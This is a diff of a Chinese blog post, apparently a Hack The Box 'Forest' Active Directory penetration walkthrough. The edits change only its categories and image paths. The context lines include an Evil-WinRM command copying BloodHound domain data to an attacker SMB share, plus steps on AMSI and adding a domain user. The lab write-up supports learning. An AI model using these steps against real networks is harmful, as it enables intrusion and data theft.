@@ -1,7 +1,7 @@
 ---
 title: '从Forest学习Windows下的渗透'
 date: 2024-11-07 13:00:00 +0800
-categories: [Windows,AD]
+categories: [Windows,AD,Htb]
 tags: [hack]
 ---
 # 从Forest学习Windows下的渗透
@@ -384,7 +384,7 @@ amsi工作原理：
   AmsiScanBuffer()
   AmsiScanString()
 
-<img src="C:/Users/qianenzhao/AppData/Roaming/Typora/typora-user-images/image-20240718190144363.png" alt="image-20240718190144363" style="zoom:75%;" />
+<img src="../assets/img/old_imgs/image-20240718190144363.png" alt="image-20240718190144363" style="zoom:75%;" />
 
 
 
@@ -689,7 +689,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 > *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> copy 20240717234949_BloodHound.zip \\10.10.16.24\kali\20240717234949_BloodHound.zip
 
-用`bloodhound`分析,标记`svc-alfresco`为已取得的主机<img src="C:/Users/qianenzhao/AppData/Roaming/Typora/typora-user-images/image-20240718181350999.png" alt="image-20240718181350999" style="zoom:75%;" />
+用`bloodhound`分析,标记`svc-alfresco`为已取得的主机<img src="../assets/img/old_imgs/image-20240718181350999.png" alt="image-20240718181350999" style="zoom:75%;" />
 
 创建一个新用户`test123`
 
